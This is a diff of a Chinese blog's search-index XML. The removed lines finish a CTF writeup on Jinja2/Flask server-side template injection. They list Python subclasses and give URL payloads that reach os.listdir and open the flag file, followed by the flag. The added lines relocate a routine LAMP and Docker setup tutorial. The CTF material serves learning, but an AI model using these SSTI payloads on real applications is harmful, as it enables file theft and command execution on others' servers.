class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.local.LocalProxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;ast.NodeVisitor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;difflib.HtmlDiff&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.RuleFactory&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.RuleTemplate&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.BaseConverter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.Map&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.MapAdapter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click._compat._FixupStream&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click._compat._AtomicFile&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.utils.LazyFile&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.utils.KeepOpenFile&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.utils.PacifyFlushWrapper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.types.ParamType&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.parser.Option&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.parser.Argument&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.parser.ParsingState&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.parser.OptionParser&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.formatting.HelpFormatter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.core.Context&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.core.BaseCommand&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.core.Parameter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.signals.Namespace&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.signals._FakeSignal&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.helpers.locked_cached_property&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.helpers._PackageBoundObject&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.cli.DispatchingApp&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.cli.ScriptInfo&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.config.ConfigAttribute&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.ctx._AppCtxGlobals&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.ctx.AppContext&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.ctx.RequestContext&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.json.tag.JSONTag&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.json.tag.TaggedJSONSerializer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.sessions.SessionInterface&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.json._JSONModule&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.json.JSONMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.blueprints.BlueprintSetupState&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.serving.WSGIRequestHandler&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.ext.Extension&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.ext._CommentFinder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.serving._SSLContext&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.serving.BaseWSGIServer&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;unicodedata.UCD&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;array.array&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;method-wrapper&#x27;</span>&gt;] <span class="hljs-keyword">not</span> found<br></code></pre></td></tr></table></figure>
-
-<p>可以在其中找到 &lt;type ‘file’&gt;类型 (可以进行文件读取)，下标是40(此项前面有40个’,’)</p>
-<p><strong>还可以看到有一个 &lt;class ‘site._Printer’&gt;类型（可以进行命令执行）</strong>，下表是71，构造payload进行命令执行</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-<p>回显</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html">URL http://61.147.171.105:50859/[&#x27;index.py&#x27;, &#x27;fl4g&#x27;] not found<br></code></pre></td></tr></table></figure>
-
-<p>接下来构造读取flag payload</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-<p>得到flag：</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctf</span>&#123;f22b6844-<span class="hljs-number">5169</span>-<span class="hljs-number">4054</span>-b2a0-d95b9361cb57&#125;<br></code></pre></td></tr></table></figure>
-
-
-
+    <title>记一次搭建LAMP web环境</title>
+    <url>/2023/11/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%90%AD%E5%BB%BALAMP%20web%E7%8E%AF%E5%A2%83/</url>
+    <content><![CDATA[<h1 id="搭建LAMP-web环境"><a href="#搭建LAMP-web环境" class="headerlink" title="搭建LAMP web环境"></a>搭建LAMP web环境</h1><h2 id="在虚拟机搭建web环境"><a href="#在虚拟机搭建web环境" class="headerlink" title="在虚拟机搭建web环境"></a>在虚拟机搭建web环境</h2><p>我的虚拟机系统是kali linux,里面已经有了Apache2和MySQL和PHP的环境</p>
+<p>终端输入<code>php -v</code>查看PHP版本</p>
+<p><img src="https://images.gaifagafin.top/202311051105539.png"></p>
+<p>终端输入<code>service Apache2 start</code> 启动Apache服务</p>
+<p>终端输入<code>service MySQL start</code> 启动MySQL服务</p>
+<p><img src="https://images.gaifagafin.top/202311051105283.png"></p>
+<p><img src="https://images.gaifagafin.top/202311051105413.png"></p>
+<p>然后终端分别输入<code>service Apache2 status</code>和<code>service MySQL status</code>查看服务状态</p>
+<p><img src="https://images.gaifagafin.top/202311051105653.png"></p>
+<p><img src="https://images.gaifagafin.top/202311051105983.png"></p>
+<p>服务正常启动</p>
+<p>接下来在网站测试服务是否可用</p>
+<p>linux浏览器输入localhost，若回显页面</p>
+<p><img src="https://images.gaifagafin.top/202311051105582.png"></p>
+<p>说明Apache服务正常</p>
+<p>接下来测试PHP服务，终端输入<code>cd /var/www/html</code></p>
+<p><img src="https://images.gaifagafin.top/202311051105350.png"></p>
+<p>在此目录下创建一个index.php文件，内容是phpinfo，输入<code>echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; index.php</code>(要在root权限下)</p>
+<p><img src="https://images.gaifagafin.top/202311051106523.png"></p>
+<p>接下来在浏览器输入<code>localhost/index.php</code>,成功看到回显，说明PHP服务正常</p>
+<p><img src="https://images.gaifagafin.top/202311051106180.png"></p>
+<p>以上做完说明web环境被成功搭建</p>
+<h2 id="在docker里搭建LAMP"><a href="#在docker里搭建LAMP" class="headerlink" title="在docker里搭建LAMP"></a>在docker里搭建LAMP</h2><p>在docker搭建lamp web环境，我这里选择拉取网上已经集成了MySQL服务和Apache服务的镜像(root权限下运行)</p>
+<p><img src="https://images.gaifagafin.top/202311051106639.png"></p>
+<p>这里我选择linode&#x2F;lamp,输入<code>docker pull linode/lamp</code></p>
+<p><img src="https://images.gaifagafin.top/202311051106325.png"></p>
+<p>输入<code>docker images</code>查看下载的镜像</p>
+<p><img src="https://images.gaifagafin.top/202311051106503.png"></p>
+<p>输入<code>docker run -tid -p 8080:80 -p 3309:3306 -v /var/www/html:/var/www/html --name lamp linode/lamp /bin/bash</code>创建容器(-p 参数是指定端口映射 ，-v参数是指定目录映射，–name 为此容器创建名字)</p>
+<p>创建成功后查看正在运行的容器<code>docker ps</code></p>
+<p><img src="https://images.gaifagafin.top/202311051106900.png"></p>
+<p>输入<code>docker exec -it 16b /bin/bash</code>进入容器(16b为容器id前3位)</p>
+<p><img src="https://images.gaifagafin.top/202311051106366.png"></p>
+<p>和之前一样开启Apache和MySQL服务</p>
+<p><img src="https://images.gaifagafin.top/202311051106049.png"></p>
+<p>在浏览器访问<code>localhost:8080</code>,如果出现无法访问的情况，则需要重启docker服务(exit退出容器)，退出容器后终端输入<code>systemctl restart docker</code></p>
+<p><img src="https://images.gaifagafin.top/202311051106627.png"></p>
+<p>再<code>docker start 容器id</code>，重复开启Apache和MySQL服务过程，在浏览器访问<code>localhost:8080</code>页面回显证明容器中的Apache服务成功运行</p>
+<p><img src="https://images.gaifagafin.top/202311051106455.png"></p>
+<p>接下来测试容器中PHP服务，容器中输入<code>cd var/www/example.com/public_html</code></p>
+<p><img src="https://images.gaifagafin.top/202311051106861.png"></p>
+<p>输入<code>&quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; 1.php</code>将测试php文件写入当前目录下</p>
+<p><img src="https://images.gaifagafin.top/202311051107831.png"></p>
+<p>浏览器输入<code>http://localhost:8080/1.php</code>访问测试php文件，看到回显，说明PHP服务也正常</p>
+<p><img src="https://images.gaifagafin.top/202311051107278.png"></p>
+<p>以上做完则成功在docker中搭建了lamp web环境</p>
 ]]></content>
       <categories>
-        <category>CTF</category>
-        <category>CTF_Writeup</category>
+        <category>杂项</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
-        <tag>Writeup</tag>
-        <tag>攻防世界</tag>
-        <tag>SSTI</tag>
+        <tag>Web</tag>
+        <tag>LAMP</tag>
+        <tag>环境</tag>
       </tags>
   </entry>
   <entry>
@@ -2796,65 +2709,6 @@ height: 100%; left: 0; top: 0;"> </iframe></div>
       <tags>
         <tag>CTF</tag>
         <tag>SSTI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>记一次搭建LAMP web环境</title>
-    <url>/2023/11/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%90%AD%E5%BB%BALAMP%20web%E7%8E%AF%E5%A2%83/</url>
-    <content><![CDATA[<h1 id="搭建LAMP-web环境"><a href="#搭建LAMP-web环境" class="headerlink" title="搭建LAMP web环境"></a>搭建LAMP web环境</h1><h2 id="在虚拟机搭建web环境"><a href="#在虚拟机搭建web环境" class="headerlink" title="在虚拟机搭建web环境"></a>在虚拟机搭建web环境</h2><p>我的虚拟机系统是kali linux,里面已经有了Apache2和MySQL和PHP的环境</p>
-<p>终端输入<code>php -v</code>查看PHP版本</p>
-<p><img src="https://images.gaifagafin.top/202311051105539.png"></p>
-<p>终端输入<code>service Apache2 start</code> 启动Apache服务</p>
-<p>终端输入<code>service MySQL start</code> 启动MySQL服务</p>
-<p><img src="https://images.gaifagafin.top/202311051105283.png"></p>
-<p><img src="https://images.gaifagafin.top/202311051105413.png"></p>
-<p>然后终端分别输入<code>service Apache2 status</code>和<code>service MySQL status</code>查看服务状态</p>
-<p><img src="https://images.gaifagafin.top/202311051105653.png"></p>
-<p><img src="https://images.gaifagafin.top/202311051105983.png"></p>
-<p>服务正常启动</p>
-<p>接下来在网站测试服务是否可用</p>
-<p>linux浏览器输入localhost，若回显页面</p>
-<p><img src="https://images.gaifagafin.top/202311051105582.png"></p>
-<p>说明Apache服务正常</p>
-<p>接下来测试PHP服务，终端输入<code>cd /var/www/html</code></p>
-<p><img src="https://images.gaifagafin.top/202311051105350.png"></p>
-<p>在此目录下创建一个index.php文件，内容是phpinfo，输入<code>echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; index.php</code>(要在root权限下)</p>
-<p><img src="https://images.gaifagafin.top/202311051106523.png"></p>
-<p>接下来在浏览器输入<code>localhost/index.php</code>,成功看到回显，说明PHP服务正常</p>
-<p><img src="https://images.gaifagafin.top/202311051106180.png"></p>
-<p>以上做完说明web环境被成功搭建</p>
-<h2 id="在docker里搭建LAMP"><a href="#在docker里搭建LAMP" class="headerlink" title="在docker里搭建LAMP"></a>在docker里搭建LAMP</h2><p>在docker搭建lamp web环境，我这里选择拉取网上已经集成了MySQL服务和Apache服务的镜像(root权限下运行)</p>
-<p><img src="https://images.gaifagafin.top/202311051106639.png"></p>
-<p>这里我选择linode&#x2F;lamp,输入<code>docker pull linode/lamp</code></p>
-<p><img src="https://images.gaifagafin.top/202311051106325.png"></p>
-<p>输入<code>docker images</code>查看下载的镜像</p>
-<p><img src="https://images.gaifagafin.top/202311051106503.png"></p>
-<p>输入<code>docker run -tid -p 8080:80 -p 3309:3306 -v /var/www/html:/var/www/html --name lamp linode/lamp /bin/bash</code>创建容器(-p 参数是指定端口映射 ，-v参数是指定目录映射，–name 为此容器创建名字)</p>
-<p>创建成功后查看正在运行的容器<code>docker ps</code></p>
-<p><img src="https://images.gaifagafin.top/202311051106900.png"></p>
-<p>输入<code>docker exec -it 16b /bin/bash</code>进入容器(16b为容器id前3位)</p>
-<p><img src="https://images.gaifagafin.top/202311051106366.png"></p>
-<p>和之前一样开启Apache和MySQL服务</p>
-<p><img src="https://images.gaifagafin.top/202311051106049.png"></p>
-<p>在浏览器访问<code>localhost:8080</code>,如果出现无法访问的情况，则需要重启docker服务(exit退出容器)，退出容器后终端输入<code>systemctl restart docker</code></p>
-<p><img src="https://images.gaifagafin.top/202311051106627.png"></p>
-<p>再<code>docker start 容器id</code>，重复开启Apache和MySQL服务过程，在浏览器访问<code>localhost:8080</code>页面回显证明容器中的Apache服务成功运行</p>
-<p><img src="https://images.gaifagafin.top/202311051106455.png"></p>
-<p>接下来测试容器中PHP服务，容器中输入<code>cd var/www/example.com/public_html</code></p>
-<p><img src="https://images.gaifagafin.top/202311051106861.png"></p>
-<p>输入<code>&quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; 1.php</code>将测试php文件写入当前目录下</p>
-<p><img src="https://images.gaifagafin.top/202311051107831.png"></p>
-<p>浏览器输入<code>http://localhost:8080/1.php</code>访问测试php文件，看到回显，说明PHP服务也正常</p>
-<p><img src="https://images.gaifagafin.top/202311051107278.png"></p>
-<p>以上做完则成功在docker中搭建了lamp web环境</p>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>LAMP</tag>
-        <tag>环境</tag>
       </tags>
   </entry>
   <entry>
